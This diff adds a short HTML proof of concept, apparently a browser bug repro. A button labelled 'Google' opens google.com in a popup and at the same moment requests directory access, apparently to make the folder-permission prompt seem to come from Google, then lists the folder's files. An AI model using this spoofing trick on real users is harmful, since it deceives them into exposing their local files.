@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>List Folder Contents</title>
+</head>
+<body>
+
+  <button id="listButton">Google</button>
+  <div id="folderContents">
+
+  </div>
+
+  <script>
+    document.getElementById('listButton').addEventListener('click', async () => {
+
+setTimeout(() => {
+  window.open("https://www.google.com", "PoC", "_blank");
+}, 5);
+
+
+      try {
+
+        const dirHandle = await window.showDirectoryPicker();
+
+
+        let fileList = [];
+        for await (const entry of dirHandle.values()) {
+          fileList.push(entry.name);  
+        }
+
+
+        const folderContentsDiv = document.getElementById('folderContents');
+        folderContentsDiv.innerHTML = ''; 
+
+        if (fileList.length > 0) {
+
+          const list = document.createElement('ul');
+          fileList.forEach(file => {
+            const listItem = document.createElement('li');
+            listItem.textContent = file;
+            list.appendChild(listItem);
+          });
+          folderContentsDiv.appendChild(list);
+        } else {
+          folderContentsDiv.textContent = 'Tidak ada file atau folder di dalam folder ini.';
+        }
+
+
+
+
+      } catch (error) {
+        console.error('Terjadi kesalahan:', error);
+
+      }
+    });
+  </script>
+
+</body>
+</html>
